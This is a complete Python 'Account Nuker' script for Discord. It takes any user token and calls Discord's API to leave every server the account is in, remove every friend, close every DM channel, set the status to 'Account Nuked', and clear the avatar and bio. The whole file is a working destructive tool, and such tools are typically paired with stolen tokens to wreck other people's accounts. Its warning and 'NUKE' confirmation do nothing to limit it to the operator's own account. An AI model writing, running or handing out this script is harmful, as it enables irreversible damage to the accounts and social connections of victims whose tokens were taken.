import requests
import time
import json
from colorama import Fore, Style, init

init()

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def center(text):
    try:
        import shutil
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    line = center(text)
    print(ansi + line + RESET)

def make_request(method, url, headers, data=None, timeout=10):
    """Make HTTP request with error handling"""
    try:
        if method.upper() == 'GET':
            response = requests.get(url, headers=headers, timeout=timeout)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=headers, json=data, timeout=timeout)
        elif method.upper() == 'DELETE':
            response = requests.delete(url, headers=headers, timeout=timeout)
        elif method.upper() == 'PATCH':
            response = requests.patch(url, headers=headers, json=data, timeout=timeout)
        else:
            return None, f"Unsupported method: {method}"
        
        return response, None
    except requests.exceptions.Timeout:
        return None, "Request timeout"
    except requests.exceptions.ConnectionError:
        return None, "Connection error"
    except Exception as e:
        return None, f"Request error: {str(e)}"

def get_user_info(token):
    """Get current user information"""
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    response, error = make_request('GET', 'https://discord.com/api/v9/users/@me', headers)
    if error:
        return None, error
    
    if response.status_code == 200:
        return response.json(), None
    elif response.status_code == 401:
        return None, "Invalid token"
    else:
        return None, f"Error {response.status_code}: {response.text}"

def leave_all_servers(token):
    """Leave all servers"""
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # Get all guilds
    response, error = make_request('GET', 'https://discord.com/api/v9/users/@me/guilds', headers)
    if error:
        return 0, 0, f"Failed to get servers: {error}"
    
    if response.status_code != 200:
        return 0, 0, f"Failed to get servers: {response.status_code}"
    
    guilds = response.json()
    left_count = 0
    failed_count = 0
    
    pretty_print(f"Found {len(guilds)} servers to leave...", (255, 128, 0))
    
    for guild in guilds:
        guild_id = guild['id']
        guild_name = guild.get('name', 'Unknown')
        
        # Try to leave server
        response, error = make_request('DELETE', f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers)
        
        if error:
            print(f"❌ Failed to leave {guild_name}: {error}")
            failed_count += 1
        elif response.status_code in [200, 204]:
            print(f"✅ Left server: {guild_name}")
            left_count += 1
        else:
            print(f"❌ Failed to leave {guild_name}: {response.status_code}")
            failed_count += 1
        
        time.sleep(0.5)  # Rate limit protection
    
    return left_count, failed_count, None

def remove_all_friends(token):
    """Remove all friends"""
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # Get all relationships
    response, error = make_request('GET', 'https://discord.com/api/v9/users/@me/relationships', headers)
    if error:
        return 0, 0, f"Failed to get friends: {error}"
    
    if response.status_code != 200:
        return 0, 0, f"Failed to get friends: {response.status_code}"
    
    relationships = response.json()
    friends = [r for r in relationships if r['type'] == 1]  # Type 1 = friends
    
    removed_count = 0
    failed_count = 0
    
    pretty_print(f"Found {len(friends)} friends to remove...", (255, 128, 0))
    
    for friend in friends:
        user_id = friend['id']
        username = friend['user'].get('username', 'Unknown')
        
        # Remove friend
        response, error = make_request('DELETE', f'https://discord.com/api/v9/users/@me/relationships/{user_id}', headers)
        
        if error:
            print(f"❌ Failed to remove {username}: {error}")
            failed_count += 1
        elif response.status_code in [200, 204]:
            print(f"✅ Removed friend: {username}")
            removed_count += 1
        else:
            print(f"❌ Failed to remove {username}: {response.status_code}")
            failed_count += 1
        
        time.sleep(0.5)  # Rate limit protection
    
    return removed_count, failed_count, None

def close_all_dms(token):
    """Close all DM channels"""
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # Get all DM channels
    response, error = make_request('GET', 'https://discord.com/api/v9/users/@me/channels', headers)
    if error:
        return 0, 0, f"Failed to get DMs: {error}"
    
    if response.status_code != 200:
        return 0, 0, f"Failed to get DMs: {response.status_code}"
    
    channels = response.json()
    dm_channels = [c for c in channels if c['type'] in [1, 3]]  # Type 1 = DM, Type 3 = Group DM
    
    closed_count = 0
    failed_count = 0
    
    pretty_print(f"Found {len(dm_channels)} DM channels to close...", (255, 128, 0))
    
    for channel in dm_channels:
        channel_id = channel['id']
        
        # Close DM
        response, error = make_request('DELETE', f'https://discord.com/api/v9/channels/{channel_id}', headers)
        
        if error:
            print(f"❌ Failed to close DM: {error}")
            failed_count += 1
        elif response.status_code in [200, 204]:
            print(f"✅ Closed DM channel")
            closed_count += 1
        else:
            print(f"❌ Failed to close DM: {response.status_code}")
            failed_count += 1
        
        time.sleep(0.3)  # Rate limit protection
    
    return closed_count, failed_count, None

def change_status(token, status_text="Account Nuked", status_type="dnd"):
    """Change user status"""
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    data = {
        "status": status_type,  # online, idle, dnd, invisible
        "custom_status": {
            "text": status_text
        }
    }
    
    response, error = make_request('PATCH', 'https://discord.com/api/v9/users/@me/settings', headers, data)
    
    if error:
        return False, f"Failed to change status: {error}"
    
    if response.status_code == 200:
        return True, "Status changed successfully"
    else:
        return False, f"Failed to change status: {response.status_code}"

def delete_account_data(token):
    """Delete various account data"""
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    actions_completed = []
    actions_failed = []
    
    # Change avatar to default
    try:
        data = {"avatar": None}
        response, error = make_request('PATCH', 'https://discord.com/api/v9/users/@me', headers, data)
        if not error and response.status_code == 200:
            actions_completed.append("Avatar removed")
        else:
            actions_failed.append("Failed to remove avatar")
    except:
        actions_failed.append("Failed to remove avatar")
    
    time.sleep(1)
    
    # Clear bio
    try:
        data = {"bio": ""}
        response, error = make_request('PATCH', 'https://discord.com/api/v9/users/@me', headers, data)
        if not error and response.status_code == 200:
            actions_completed.append("Bio cleared")
        else:
            actions_failed.append("Failed to clear bio")
    except:
        actions_failed.append("Failed to clear bio")
    
    return actions_completed, actions_failed

def run_account_nuker():
    """Main account nuker function"""
    import os
    os.system('cls' if os.name == 'nt' else 'clear')
    
    pretty_print("🔥 ACCOUNT NUKER 🔥", (255, 0, 0))
    pretty_print("⚠️  WARNING: This will perform destructive actions on your Discord account!", (255, 64, 0))
    pretty_print("This action cannot be undone!", (255, 128, 0))
    print()
    
    # Get token
    token = input(rgb(255,32,32) + "Enter Discord Token: " + RESET).strip()
    if not token:
        pretty_print("No token provided!", (255, 0, 0))
        return
    
    # Validate token
    pretty_print("Validating token...", (255, 128, 0))
    user_info, error = get_user_info(token)
    if error:
        pretty_print(f"Token validation failed: {error}", (255, 0, 0))
        return
    
    username = user_info.get('username', 'Unknown')
    discriminator = user_info.get('discriminator', '0000')
    pretty_print(f"✅ Token valid for: {username}#{discriminator}", (0, 255, 0))
    print()
    
    # Final confirmation
    confirm = input(rgb(255,0,0) + f"Are you SURE you want to nuke the account {username}#{discriminator}? (type 'NUKE' to confirm): " + RESET)
    if confirm != 'NUKE':
        pretty_print("Account nuking cancelled.", (255, 128, 0))
        return
    
    print()
    pretty_print("🔥 Starting account nuke process...", (255, 0, 0))
    print()
    
    # Step 1: Leave all servers
    pretty_print("Step 1: Leaving all servers...", (255, 128, 0))
    left, failed, error = leave_all_servers(token)
    if error:
        pretty_print(f"❌ Server leaving failed: {error}", (255, 0, 0))
    else:
        pretty_print(f"✅ Left {left} servers, {failed} failed", (0, 255, 0))
    print()
    
    # Step 2: Remove all friends
    pretty_print("Step 2: Removing all friends...", (255, 128, 0))
    removed, failed, error = remove_all_friends(token)
    if error:
        pretty_print(f"❌ Friend removal failed: {error}", (255, 0, 0))
    else:
        pretty_print(f"✅ Removed {removed} friends, {failed} failed", (0, 255, 0))
    print()
    
    # Step 3: Close all DMs
    pretty_print("Step 3: Closing all DM channels...", (255, 128, 0))
    closed, failed, error = close_all_dms(token)
    if error:
        pretty_print(f"❌ DM closing failed: {error}", (255, 0, 0))
    else:
        pretty_print(f"✅ Closed {closed} DMs, {failed} failed", (0, 255, 0))
    print()
    
    # Step 4: Change status
    pretty_print("Step 4: Changing status...", (255, 128, 0))
    success, message = change_status(token, "Account Nuked 🔥", "dnd")
    if success:
        pretty_print(f"✅ {message}", (0, 255, 0))
    else:
        pretty_print(f"❌ {message}", (255, 0, 0))
    print()
    
    # Step 5: Delete account data
    pretty_print("Step 5: Clearing account data...", (255, 128, 0))
    completed, failed = delete_account_data(token)
    for action in completed:
        pretty_print(f"✅ {action}", (0, 255, 0))
    for action in failed:
        pretty_print(f"❌ {action}", (255, 0, 0))
    print()
    
    pretty_print("🔥 Account nuke process completed! 🔥", (255, 0, 0))
    pretty_print("The Discord account has been successfully nuked.", (0, 255, 0))
    print()
    
    input(rgb(255,32,32) + "Press Enter to continue..." + RESET)

if __name__ == "__main__":
    run_account_nuker() 